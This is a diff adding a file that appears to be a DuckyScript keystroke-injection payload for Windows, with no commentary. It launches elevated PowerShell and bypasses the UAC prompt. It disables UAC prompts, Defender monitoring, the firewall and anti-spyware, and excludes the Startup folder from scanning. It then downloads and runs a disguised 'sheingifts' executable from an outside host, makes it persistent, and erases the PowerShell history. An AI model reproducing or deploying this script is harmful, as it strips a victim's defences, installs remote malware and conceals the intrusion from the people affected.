@@ -1,0 +1,39 @@
+DELAY 2000
+GUI r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2500
+LEFT
+ENTER
+DELAY 2000
+STRING Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -WindowStyle Hidden
+ENTER
+DELAY 2000
+STRING Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue -WindowStyle Hidden
+ENTER
+DELAY 2000
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -WindowStyle Hidden
+ENTER
+DELAY 2000
+STRING New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force -WindowStyle Hidden
+ENTER
+DELAY 2000
+STRING Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\*" -ErrorAction SilentlyContinue -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $request = New-Object System.Net.WebClient; $request.DownloadFile('https://ph0n3fr33.000webhostapp.com/promo/sheingifts.zip', 'C:\Windows\sheingifts.zip')
+ENTER
+DELAY 15000
+STRING Expand-Archive -Path 'C:\Windows\sheingifts.zip' -DestinationPath 'C:\Windows'
+ENTER
+DELAY 5000
+STRING Move-Item -Path 'C:\Windows\sheingifts.exe' -Destination 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
+ENTER
+DELAY 1000
+STRING Start-Process -FilePath 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\sheingifts.exe'
+ENTER
+DELAY 2000
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+ENTER
+DELAY 1000
